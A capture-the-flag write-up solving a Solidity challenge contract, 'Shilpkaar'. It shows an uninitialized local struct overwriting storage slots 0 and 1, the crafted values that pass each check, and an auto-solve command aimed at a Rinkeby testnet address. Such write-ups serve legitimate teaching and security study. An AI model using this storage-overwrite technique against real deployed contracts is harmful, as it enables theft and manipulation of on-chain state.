# Shilpkaar

With difference, one of the most annoying puzzles of the set. From Wikipidia, [Shilpkar](https://en.wikipedia.org/wiki/Shilpkar) are _an artisan community mainly associated with Intaglio techniques and painting_. This is indeed a hint on what must be done in order to solve the puzzle. In particular, to solve this puzzle, we will need to carefully craft a set of data that allows us to pass the multiple complex checks inside the challenge contract.

But first of all we need to find the key to the first lock, which is hidden in plain sight.

## Unlock

Looking at the functions we can see that the `roulette()` function is first protected by the requirement of the called to be in the `shilpkaar` mapping. Looking at the contract it seems the only possible way of achieving this is by calling the `unlock()` function first and passing all the checks.

However the unlock function first check seems to lock us out of calling it at all! The first check needs the state variables `gate1Unlocked` and `gate2Unlocked` to be set to `true`. These 2 variables are unitialized (meaning they are both false) and they are not set anywhere.

Typically when presented with a puzzle like this, there is either an array underflow to be exploited, or a more subtle one in the shape of complex data type declared locally without specifying its data location. What does this mean? Back in Solidity 0.4 you could declare a local complex variable (like a struct) without specifying its data location. If you didn't specify it then it would, by default, be pointing to a storage location. In particular to the slot 0 of the contract storage. This is OK as far as you don't write to it and just use it to later on point it to the right location. However, if you would write to it before pointing it to a valid location...it would directly overwrite the contents of the contract storage starting from the slot 0.

This is exactly what is happening in the `unlock` function:

```
  function unlock(bytes32 _name, bytes32 _password) external {
        regInfo regRecord;
        regRecord.name = _name;
        regRecord.password = _password;
```

`regRecord` is declared but not pointed to a valid location, and then it's members are set to `_name` and `_password`. Because `regRecord.name` and `regRecord.password` are `bytes32` variables, they are actually pointing to the slot 0 and slot 1 of the contract storage (each slot is 32 bytes long).

This gives us control over the first two slots of the contract storage.

The second part of this section of the puzzle is to realize that there is more than 1 variable mapped to the slot 0, and that the same follows for the slot 1. In particular:

```
    // Slot 0
    address private garbageAddress;  //         160 bits
    bool private gate1Unlocked;      //         8 bits
    uint16 private gateKey1;         //         16 bits
    uint72 public rouletteStartTime; //         72 bits
                                     // TOTAL   256 bits = 32 bytes = 1 slot

    // Slot 1
    uint64 private gateKey2;         //         64 bits
    uint64 private gateKey3;         //         64 bits
    bool private gate2Unlocked;      //         8 bits
    uint64 private gateKey4;         //         64 bits
    uint56 private gateKey5;         //         56 bits
                                     // TOTAL   256 bits = 32 bytes = 1 slot
```

With this information we can craft a set of data that will allow us to pass the multiple checks inside the challenge contract.

## First two checks

The values for `gate1Unlocked` and `gate2Unlocked` are set to `true` to pass the first check. Then the second check requires us to fill in the `garbageAddress` variable with a value that meets the folowing expectation:

```
        require(
            uint256(garbageAddress) > 2**153 + garbageNonce &&
                uint256(garbageAddress) <= 2**160 - ((garbageDivisor - 1) - garbageNonce),
            "Problem With garbageAddress"
        );
```

Looking at the condition we can set `garbageAddress` to be:

```
        garbageAddress = address(uint160(2**153 + garbageNonce + 1));
```

and pass both tests. Because `garbageNonce` is public we can read it and use it in the formula.

## The prime conundrum and the master key

This part was the most difficult to craft along the `masterKey` value. The next check looks like this:

```
        require(
            gateKey3 < (uint256(uint64(-1)) * 49) / 100 &&
                gateKey4 < (uint256(uint64(-1)) * 51) / 100 &&
                probablyPrime(gateKey3) &&
                probablyPrime(gateKey4),
            "Problem with gateKeys"
        );
```

It basically says that `gateKey3` must be less than 49% of the maximum value of `uint64` and `gateKey4` must be less than 51% of the maximum value of `uint64`. Oh, and both must be possibly primes!

Because I will need this keys to add up to a certain value for `masterKey` to be valid, I crafted a value to be added and substracted to `gateKey3` and `gateKey4`. This way by adding up `gateKey3` and `gateKey4` the extra value addition and substraction cancel out, but allows us to bring the values of `gateKey3` and `gateKey4` to the desired range:

```
uint64 gateKeysCompensation = uint64(2**63 - ((uint256(type(uint64).max) * 49) / 100));
```

Now we can define the `gateKey3` and `gateKey4` values as:

```
        uint64 gateKey3 = 2**63 - gateKeysCompensation;
        uint64 gateKey4 = 2**63 + gateKeysCompensation;
```

This makes both values to be in range, but they are still not prime. In order to find the prime number that is closest to the desired value, I used this [website](https://www.numberempire.com/primenumbers.php) that calculates the closes prime number (next or previous) to the one given. Passing the values for `gateKey3` and `gatekey4` we can gate their respectives previous prime numbers and adjust the formula to hit the target:

```
        uint64 gateKey3 = 2**63 - 44 - gateKeysCompensation;
        uint64 gateKey4 = 2**63 - 92 + gateKeysCompensation;
```

The `masterKey` is calculated like this:

```
        uint256 masterKey = uint256(gateKey1) +
            uint256(gateKey2) +
            uint256(gateKey3) +
            uint256(gateKey4) +
            uint256(gateKey5);
```

And we need `masterKey` to meet the following check:

```
        require(
            masterKey > (2**65 + 2**56) + masterNonce &&
                masterKey < (2**65 + 2**56 + 2**16) - ((masterDivisor - 1) - masterNonce),
            "Problem with masterkey"
        );
```

If we add up all the values composing the `masterKey` we can see that we are short by `masterNonce` and an extra 139. This is great because we have one free variable available which is `gateKey1`. We can use this variable to add the missing value to `masterKey`. It is a `uint16` but it is enough to hold the needed offset:

```
        uint16 gateKey1 = 139 + uint16(masterNonce);
```

## Roulette Start Time

The last value we need to set is the `rouletteStartTime`. This will the time used in the `roulette` function check:

```
     require(block.timestamp >= timeToRoll[msg.sender], "Problem with timeToRoll");
```

The easiest is to set it to 0, so we can call `roulette` at any time.

## Final Hack

With all these values now we can craft the values for `name` and `password`:

```
        bytes32 name = bytes32(abi.encodePacked(rouletteStartTime, gateKey1, gate1Unlocked, garbageAddress));
        bytes32 password = bytes32(abi.encodePacked(gateKey5, gateKey4, gate2Unlocked, gateKey3, gateKey2));
```

We can call `unlock` with this values and then `roulette` to win the challenge~

## Solution

Solved by deployer: 0xc892cfd3e75Cf428BDD25576e9a42D515697B2C7
Solution contract address: 0x16c0dBDD7eEe418C7342a2A81737e6Bb9b3BE4F8

Solution contract: [ShilpkaarSolution](./contracts/solutions/ShilpkaarSolution.sol)
Solution Script: [solveShilpkaar.ts](./tasks/solveShilpkaar.ts)

You will need to check the challenge contract internal transactions to see the calls from the solution contract

## Auto-solve

To solve this challenge you can use the following command:

```
$ yarn solve-shilpkaar:rinkeby --shilpkaar-address 0x8b6Df584c5b82F9647a63a66cfD45006ccB777FF
```

The deployed attack contract ShilpkaarSolution address will be the one registered as being pwned the Shilpkaar contract.
